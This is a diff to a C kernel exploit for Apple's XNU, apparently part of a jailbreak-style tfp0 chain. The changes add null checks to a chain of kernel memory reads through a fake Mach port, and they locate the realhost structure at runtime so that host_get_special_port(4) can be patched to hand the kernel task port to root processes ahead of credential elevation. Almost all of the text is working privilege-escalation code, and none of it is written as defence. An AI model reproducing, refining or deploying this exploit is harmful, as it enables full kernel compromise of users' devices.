@@ -400,7 +400,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     fakeport->ip_lock.type = 0x11;
     fakeport->ip_messages.port.receiver_name = 1;
     fakeport->ip_messages.port.msgcount = 0;
-    fakeport->ip_messages.port.qlimit = 1;
+    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
     fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
     fakeport->ip_srights = 99;
      
@@ -601,22 +601,52 @@ value = value | ((uint64_t)read64_tmp << 32)
     }
 
     uint64_t ikmq_base = fakeport->ip_messages.port.messages;
+    if (ikmq_base == 0x0)
+    {
+        LOG("failed to find ikmq_base!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("got ikmq_base: 0x%llx", ikmq_base);
 
     uint64_t ikm_header = 0x0;
     rk64(ikmq_base + 0x18, ikm_header); /* ipc_kmsg->ikm_header */
+    if (ikm_header == 0x0)
+    {
+        LOG("failed to find ikm_header!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("ikm_header: 0x%llx", ikm_header);
 
     uint64_t port_addr = 0x0;
     rk64(ikm_header + 0x24, port_addr); /* 0x24 is mach_msg_header_t + body + offset of our port into mach_port_descriptor_t */ 
+    if (port_addr == 0x0)
+    {
+        LOG("failed to find port_addr!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("port_addr: 0x%llx", port_addr);
 
     uint64_t itk_space = 0x0;
     rk64(port_addr + offsetof(kport_t, ip_receiver), itk_space);
+    if (itk_space == 0x0)
+    {
+        LOG("failed to find itk_space!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("itk_space: 0x%llx", itk_space);
 
     uint64_t ourtask = 0x0;
     rk64(itk_space + 0x28, ourtask); /* ipc_space->is_task */
+    if (ourtask == 0x0)
+    {
+        LOG("failed to find ourtask!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("ourtask: 0x%llx", ourtask);
 
     ret = mach_ports_register(mach_task_self(), &client, 1);
@@ -948,11 +978,55 @@ value = value | ((uint64_t)read64_tmp << 32)
 
     free((void *)uland_port);
     
+    /* find realhost */
+    ret = send_port(the_one, mach_host_self());
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+    
+    /* since this is the 2nd message we've sent to this port, our msg will lie in ipc_kmsg->next */
+    uint64_t ikm_next = kread64(ikmq_base + 0x8);
+    if (ikm_next == 0x0)
+    {
+        LOG("failed to find ikm_next!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("ikm_next: 0x%llx", ikm_next);
+
+    ikm_header = kread64(ikm_next + 0x18);
+    if (ikm_header == 0x0)
+    {
+        LOG("failed to find ikm_header!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("ikm_header: 0x%llx", ikm_header);
+
+    port_addr = kread64(ikm_header + 0x24);
+    if (port_addr == 0x0)
+    {
+        LOG("failed to find port_addr!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("port_addr: 0x%llx", port_addr);
+
+    uint64_t realhost = kread64(port_addr + offsetof(kport_t, ip_kobject));
+    if (realhost == 0x0)
+    {
+        LOG("failed to find realhost!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+
     /*
         host_get_special_port(4) patch
         allows the kernel task port to be accessed by any root process 
     */
-    kwrite64(offsets->data.realhost + kslide + 0x10 + (sizeof(uint64_t) * 4), new_port);
+    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
 
     /* eleveate creds to kernel */
     
